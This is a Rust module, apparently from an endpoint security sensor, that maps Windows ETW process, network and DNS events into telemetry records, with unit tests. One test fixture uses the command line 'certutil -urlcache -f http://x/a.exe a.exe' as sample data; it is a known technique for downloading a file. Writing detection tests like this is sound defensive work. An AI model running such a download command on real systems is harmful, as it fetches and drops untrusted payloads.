//! ETW record → TRAPD event mapping (platform-neutral, unit-tested anywhere).
//!
//! The Windows ETW sensor (`collectors::windows::etw`) decodes each event with
//! TDH into an [`EtwRecord`]: provider, event id, header PID/time and the named
//! properties. Everything after that — which provider/event means what, how
//! addresses and ports are laid out, how NT device paths become drive paths —
//! lives here, so it is tested without a Windows kernel.
//!
//! Providers (GUIDs verified against the published manifests):
//!
//! | Provider | GUID | Keywords | Events |
//! |---|---|---|---|
//! | Microsoft-Windows-Kernel-Process | `22fb2cd6-0e7b-422b-a0c7-2fad1fd0e716` | `0x10` process, `0x40` image | 1 ProcessStart, 2 ProcessStop, 5 ImageLoad |
//! | Microsoft-Windows-Kernel-Network | `7dd42a49-5329-4832-8dfd-43d979153a88` | `0x10` IPv4, `0x20` IPv6 | 12/28 connect, 15/31 accept |
//! | Microsoft-Windows-DNS-Client | `1c95126e-7eea-49a9-a3fe-a378b03ddb4d` | all | 3008 query completed |
//!
//! Property names differ slightly between Windows builds (`ImageName` vs.
//! `ImageFileName`, `ParentProcessID` vs. `ParentId`); every lookup accepts the
//! known aliases.

use std::collections::HashMap;
use std::net::{Ipv4Addr, Ipv6Addr};

use crate::schema::{
    DnsResolutionData, NetworkConnectionData, ProcessCreateData, ProcessTerminateData,
};

pub const KERNEL_PROCESS: u128 = 0x22fb2cd6_0e7b_422b_a0c7_2fad1fd0e716;
pub const KERNEL_NETWORK: u128 = 0x7dd42a49_5329_4832_8dfd_43d979153a88;
pub const DNS_CLIENT: u128 = 0x1c95126e_7eea_49a9_a3fe_a378b03ddb4d;

pub const KERNEL_PROCESS_KEYWORDS: u64 = 0x10 | 0x40;
pub const KERNEL_NETWORK_KEYWORDS: u64 = 0x10 | 0x20;

/// One decoded property value.
#[derive(Debug, Clone, PartialEq)]
pub enum EtwValue {
    Str(String),
    /// Integer value plus its raw little-endian bytes (ports and IPv4
    /// addresses are stored in network byte order and need the raw form).
    Int(u64, Vec<u8>),
    Bytes(Vec<u8>),
}

/// A decoded ETW event.
#[derive(Debug, Clone, Default)]
pub struct EtwRecord {
    pub provider: u128,
    pub id: u16,
    /// `EVENT_HEADER.ProcessId` — the process that *logged* the event.
    pub header_pid: u32,
    /// `EVENT_HEADER.TimeStamp` as FILETIME ticks.
    pub timestamp: i64,
    pub props: HashMap<String, EtwValue>,
}

impl EtwRecord {
    fn get(&self, names: &[&str]) -> Option<&EtwValue> {
        names.iter().find_map(|n| self.props.get(*n))
    }
    pub fn str(&self, names: &[&str]) -> Option<String> {
        match self.get(names)? {
            EtwValue::Str(s) => Some(s.clone()),
            _ => None,
        }
    }
    pub fn int(&self, names: &[&str]) -> Option<u64> {
        match self.get(names)? {
            EtwValue::Int(v, _) => Some(*v),
            _ => None,
        }
    }
    fn raw(&self, names: &[&str]) -> Option<Vec<u8>> {
        match self.get(names)? {
            EtwValue::Int(_, raw) | EtwValue::Bytes(raw) => Some(raw.clone()),
            EtwValue::Str(_) => None,
        }
    }
}

/// NT device prefix → drive, e.g. (`\Device\HarddiskVolume3`, `C:`).
pub type DeviceMap = Vec<(String, String)>;

/// `\Device\HarddiskVolume3\Windows\System32\cmd.exe` → `C:\Windows\…`.
/// Paths already in drive form pass through; unknown devices stay as they are
/// (still useful as evidence, and never mistaken for a drive path).
pub fn device_to_dos(path: &str, devices: &DeviceMap) -> String {
    let path = path.strip_prefix("\\??\\").unwrap_or(path);
    for (device, drive) in devices {
        if path.len() > device.len()
            && path[..device.len()].eq_ignore_ascii_case(device)
            && path.as_bytes()[device.len()] == b'\\'
        {
            return format!("{drive}{}", &path[device.len()..]);
        }
    }
    path.to_string()
}

fn basename(path: &str) -> String {
    path.rsplit(['\\', '/']).next().unwrap_or(path).to_string()
}

/// What a process start needs from outside the event (looked up while the
/// process is still alive): command line, account and image hash.
#[derive(Debug, Clone, Default)]
pub struct ProcessEnrichment {
    pub exe: Option<String>,
    pub cmdline: Option<String>,
    pub username: Option<String>,
    pub exe_sha256: Option<String>,
}

/// Kernel-Process event 1 → process create.
pub fn process_start(
    rec: &EtwRecord,
    devices: &DeviceMap,
    enrich: ProcessEnrichment,
) -> Option<ProcessCreateData> {
    if rec.provider != KERNEL_PROCESS || rec.id != 1 {
        return None;
    }
    let pid = rec.int(&["ProcessID", "ProcessId"])? as i32;
    let ppid = rec
        .int(&["ParentProcessID", "ParentId", "ParentProcessId"])
        .unwrap_or(0) as i32;
    let image = rec
        .str(&["ImageName", "ImageFileName"])
        .map(|p| device_to_dos(&p, devices))
        .unwrap_or_default();
    let exe = enrich.exe.filter(|e| !e.is_empty()).unwrap_or(image);
    let mut notes = crate::telemetry::Enrichment::new();
    let cmdline = enrich.cmdline.unwrap_or_default();
    if cmdline.is_empty() {
        // The process may have exited before the lookup (the reason ETW is
        // needed at all); the start itself is still recorded.
        notes.fail("cmdline", crate::telemetry::EnrichmentError::IoError);
    }
    let username = enrich.username.unwrap_or_else(|| "unknown".into());
    Some(ProcessCreateData {
        pid,
        ppid,
        name: basename(&exe),
        exe,
        cmdline,
        uid: 0,
        username,
        exe_sha256: enrich.exe_sha256,
        process_start_time: rec.int(&["CreateTime"]).filter(|t| *t > 0),
        enrichment: notes.finish(0),
    })
}

/// Kernel-Process event 2 → process terminate.
pub fn process_stop(rec: &EtwRecord, devices: &DeviceMap) -> Option<ProcessTerminateData> {
    if rec.provider != KERNEL_PROCESS || rec.id != 2 {
        return None;
    }
    let pid = rec.int(&["ProcessID", "ProcessId"])? as i32;
    let name = rec
        .str(&["ImageName", "ImageFileName"])
        .map(|p| basename(&device_to_dos(&p, devices)))
        .unwrap_or_default();
    Some(ProcessTerminateData { pid, name })
}

/// Kernel-Process event 5 → (pid, loaded image path).
pub fn image_load(rec: &EtwRecord, devices: &DeviceMap) -> Option<(i32, String)> {
    if rec.provider != KERNEL_PROCESS || rec.id != 5 {
        return None;
    }
    let pid = rec.int(&["ProcessID", "ProcessId"])? as i32;
    let image = rec.str(&["ImageName", "FileName"])?;
    Some((pid, device_to_dos(&image, devices)))
}

/// Address property → text. IPv4 arrives as a 4-byte integer in network
/// order, IPv6 as 16 raw bytes.
fn address(rec: &EtwRecord, name: &str) -> Option<String> {
    let raw = rec.raw(&[name])?;
    match raw.len() {
        4 => Some(Ipv4Addr::new(raw[0], raw[1], raw[2], raw[3]).to_string()),
        16 => {
            let mut b = [0u8; 16];
            b.copy_from_slice(&raw);
            Some(Ipv6Addr::from(b).to_string())
        }
        _ => None,
    }
}

/// Port property → host order (stored big-endian on the wire).
fn port(rec: &EtwRecord, name: &str) -> Option<u16> {
    let raw = rec.raw(&[name])?;
    (raw.len() == 2).then(|| u16::from_be_bytes([raw[0], raw[1]]))
}

/// Kernel-Network connect/accept → connection record.
pub fn network_connection(
    rec: &EtwRecord,
    process: Option<String>,
) -> Option<NetworkConnectionData> {
    if rec.provider != KERNEL_NETWORK {
        return None;
    }
    let inbound = match rec.id {
        12 | 28 => false,
        15 | 31 => true,
        _ => return None,
    };
    let pid = rec.int(&["PID"]).map(|p| p as i32);
    let daddr = address(rec, "daddr")?;
    let saddr = address(rec, "saddr")?;
    let dport = port(rec, "dport")?;
    let sport = port(rec, "sport")?;
    let v6 = daddr.contains(':');
    // The provider reports both directions from the local socket's view:
    // `saddr`/`sport` are local for a connect, remote for an accept.
    let (src_addr, src_port, dst_addr, dst_port) = if inbound {
        (daddr, dport, saddr, sport)
    } else {
        (saddr, sport, daddr, dport)
    };
    Some(NetworkConnectionData {
        protocol: if v6 { "tcp6" } else { "tcp" }.into(),
        src_addr,
        src_port,
        dst_addr,
        dst_port,
        state: if inbound { "accepted" } else { "established" }.into(),
        pid,
        process,
        duration_ms: None,
        bytes_sent: None,
        bytes_recv: None,
        packets_sent: None,
        packets_recv: None,
        rtt_us: None,
    })
}

fn qtype_name(t: u64) -> String {
    match t {
        1 => "A".into(),
        2 => "NS".into(),
        5 => "CNAME".into(),
        6 => "SOA".into(),
        12 => "PTR".into(),
        15 => "MX".into(),
        16 => "TXT".into(),
        28 => "AAAA".into(),
        33 => "SRV".into(),
        65 => "HTTPS".into(),
        255 => "ANY".into(),
        other => format!("TYPE{other}"),
    }
}

/// `QueryStatus` (Win32/DNS error code) → DNS response code text.
fn rcode(status: u64) -> String {
    match status {
        0 => "NOERROR".into(),
        9003 => "NXDOMAIN".into(),
        9002 => "SERVFAIL".into(),
        9005 => "REFUSED".into(),
        9501 => "NOERROR".into(), // DNS_INFO_NO_RECORDS: name exists, no data
        1460 => "TIMEOUT".into(),
        other => format!("ERROR{other}"),
    }
}

/// DNS-Client event 3008 (query completed) → resolution record. Returns the
/// querying PID alongside (the schema has no PID field).
pub fn dns_query(rec: &EtwRecord) -> Option<(u32, DnsResolutionData)> {
    if rec.provider != DNS_CLIENT || rec.id != 3008 {
        return None;
    }
    let qname = rec.str(&["QueryName"])?.trim_end_matches('.').to_string();
    if qname.is_empty() {
        return None;
    }
    let qtype = qtype_name(rec.int(&["QueryType"]).unwrap_or(0));
    let status = rec.int(&["QueryStatus", "Status"]).unwrap_or(0);
    // `QueryResults` looks like "10.0.0.5;::ffff:10.0.0.5;type:  5 cdn.example;".
    let (mut ips, mut cnames) = (Vec::new(), Vec::new());
    for part in rec.str(&["QueryResults"]).unwrap_or_default().split(';') {
        let part = part.trim();
        if part.is_empty() {
            continue;
        }
        if let Some(rest) = part.strip_prefix("type:") {
            if let Some(name) = rest.split_whitespace().nth(1) {
                cnames.push(name.trim_end_matches('.').to_string());
            }
        } else if part.parse::<std::net::IpAddr>().is_ok() {
            ips.push(part.trim_start_matches("::ffff:").to_string());
        }
    }
    ips.dedup();
    Some((
        rec.header_pid,
        DnsResolutionData {
            qname,
            qtype,
            resolved_ips: ips,
            cnames,
            server_addr: String::new(),
            client_addr: String::new(),
            transaction_id: 0,
            rcode: rcode(status),
        },
    ))
}

#[cfg(test)]
mod tests {
    use super::*;

    fn rec(provider: u128, id: u16, props: &[(&str, EtwValue)]) -> EtwRecord {
        EtwRecord {
            provider,
            id,
            header_pid: 4,
            timestamp: 0,
            props: props
                .iter()
                .map(|(k, v)| (k.to_string(), v.clone()))
                .collect(),
        }
    }
    fn int(v: u64, width: usize) -> EtwValue {
        EtwValue::Int(v, v.to_le_bytes()[..width].to_vec())
    }
    fn s(v: &str) -> EtwValue {
        EtwValue::Str(v.into())
    }

    fn devices() -> DeviceMap {
        vec![
            ("\\Device\\HarddiskVolume3".into(), "C:".into()),
            ("\\Device\\HarddiskVolume10".into(), "D:".into()),
        ]
    }

    #[test]
    fn device_paths_map_to_drives() {
        let d = devices();
        assert_eq!(
            device_to_dos("\\Device\\HarddiskVolume3\\Windows\\System32\\cmd.exe", &d),
            "C:\\Windows\\System32\\cmd.exe"
        );
        // Volume3 must not match Volume30 / the Volume10 prefix of another.
        assert_eq!(
            device_to_dos("\\Device\\HarddiskVolume10\\x.exe", &d),
            "D:\\x.exe"
        );
        assert_eq!(
            device_to_dos("\\Device\\HarddiskVolume30\\x.exe", &d),
            "\\Device\\HarddiskVolume30\\x.exe"
        );
        assert_eq!(device_to_dos("\\??\\C:\\x.exe", &d), "C:\\x.exe");
        assert_eq!(device_to_dos("C:\\x.exe", &d), "C:\\x.exe");
    }

    #[test]
    fn process_start_uses_enrichment_and_survives_without_it() {
        let r = rec(
            KERNEL_PROCESS,
            1,
            &[
                ("ProcessID", int(4242, 4)),
                ("ParentProcessID", int(1000, 4)),
                ("CreateTime", int(133_000_000_000_000_000, 8)),
                (
                    "ImageName",
                    s("\\Device\\HarddiskVolume3\\Windows\\System32\\certutil.exe"),
                ),
            ],
        );
        let p = process_start(
            &r,
            &devices(),
            ProcessEnrichment {
                cmdline: Some("certutil -urlcache -f http://x/a.exe a.exe".into()),
                username: Some("CORP\\anna".into()),
                ..Default::default()
            },
        )
        .unwrap();
        assert_eq!((p.pid, p.ppid), (4242, 1000));
        assert_eq!(p.exe, "C:\\Windows\\System32\\certutil.exe");
        assert_eq!(p.name, "certutil.exe");
        assert_eq!(p.process_start_time, Some(133_000_000_000_000_000));
        assert_eq!(p.username, "CORP\\anna");

        // A process gone before enrichment still yields an event.
        let p = process_start(&r, &devices(), ProcessEnrichment::default()).unwrap();
        assert!(p.cmdline.is_empty());
        assert_eq!(p.username, "unknown");

        // Aliases of older builds.
        let old = rec(
            KERNEL_PROCESS,
            1,
            &[
                ("ProcessId", int(7, 4)),
                ("ParentId", int(6, 4)),
                ("ImageFileName", s("C:\\a.exe")),
            ],
        );
        assert_eq!(
            process_start(&old, &devices(), ProcessEnrichment::default())
                .unwrap()
                .ppid,
            6
        );
        assert!(process_start(
            &rec(KERNEL_NETWORK, 1, &[]),
            &devices(),
            ProcessEnrichment::default()
        )
        .is_none());
    }

    #[test]
    fn process_stop_and_image_load() {
        let stop = rec(
            KERNEL_PROCESS,
            2,
            &[
                ("ProcessID", int(9, 4)),
                ("ImageName", s("\\Device\\HarddiskVolume3\\x\\y.exe")),
            ],
        );
        assert_eq!(process_stop(&stop, &devices()).unwrap().name, "y.exe");
        let load = rec(
            KERNEL_PROCESS,
            5,
            &[
                ("ProcessID", int(9, 4)),
                (
                    "ImageName",
                    s("\\Device\\HarddiskVolume3\\Users\\a\\AppData\\x.dll"),
                ),
            ],
        );
        assert_eq!(
            image_load(&load, &devices()).unwrap(),
            (9, "C:\\Users\\a\\AppData\\x.dll".to_string())
        );
    }

    #[test]
    fn network_connect_decodes_network_order() {
        // 10.20.0.5:443 ← 10.20.0.50:51000, as the provider stores them.
        let r = rec(
            KERNEL_NETWORK,
            12,
            &[
                ("PID", int(1234, 4)),
                ("daddr", EtwValue::Int(0, vec![10, 20, 0, 5])),
                ("saddr", EtwValue::Int(0, vec![10, 20, 0, 50])),
                ("dport", EtwValue::Int(0, 443u16.to_be_bytes().to_vec())),
                ("sport", EtwValue::Int(0, 51000u16.to_be_bytes().to_vec())),
            ],
        );
        let c = network_connection(&r, Some("x.exe".into())).unwrap();
        assert_eq!(
            (c.dst_addr.as_str(), c.dst_port, c.src_port),
            ("10.20.0.5", 443, 51000)
        );
        assert_eq!(c.pid, Some(1234));
        assert_eq!(c.state, "established");

        let mut accept = r.clone();
        accept.id = 15;
        let a = network_connection(&accept, None).unwrap();
        assert_eq!(
            (a.dst_addr.as_str(), a.dst_port, a.state.as_str()),
            ("10.20.0.50", 51000, "accepted")
        );

        let mut v6 = r.clone();
        v6.id = 28;
        v6.props.insert(
            "daddr".into(),
            EtwValue::Bytes("2001:db8::1".parse::<Ipv6Addr>().unwrap().octets().to_vec()),
        );
        v6.props.insert(
            "saddr".into(),
            EtwValue::Bytes(Ipv6Addr::LOCALHOST.octets().to_vec()),
        );
        let c6 = network_connection(&v6, None).unwrap();
        assert_eq!(
            (c6.protocol.as_str(), c6.dst_addr.as_str()),
            ("tcp6", "2001:db8::1")
        );

        let mut other = r.clone();
        other.id = 10; // data sent: not a connection start
        assert!(network_connection(&other, None).is_none());
    }

    #[test]
    fn dns_query_parses_results() {
        let r = rec(
            DNS_CLIENT,
            3008,
            &[
                ("QueryName", s("login.microsoftonline.com.")),
                ("QueryType", int(1, 2)),
                ("QueryStatus", int(0, 4)),
                (
                    "QueryResults",
                    s("type:  5 login.mso.msidentity.com;20.190.159.0;::ffff:20.190.159.0;"),
                ),
            ],
        );
        let (pid, d) = dns_query(&r).unwrap();
        assert_eq!(pid, 4);
        assert_eq!(d.qname, "login.microsoftonline.com");
        assert_eq!(d.qtype, "A");
        assert_eq!(d.rcode, "NOERROR");
        assert_eq!(d.cnames, vec!["login.mso.msidentity.com".to_string()]);
        assert_eq!(d.resolved_ips, vec!["20.190.159.0".to_string()]);

        let nx = rec(
            DNS_CLIENT,
            3008,
            &[
                ("QueryName", s("nope.corp")),
                ("QueryType", int(28, 2)),
                ("QueryStatus", int(9003, 4)),
            ],
        );
        let (_, d) = dns_query(&nx).unwrap();
        assert_eq!((d.qtype.as_str(), d.rcode.as_str()), ("AAAA", "NXDOMAIN"));
        assert!(dns_query(&rec(DNS_CLIENT, 3006, &[("QueryName", s("x"))])).is_none());
    }
}
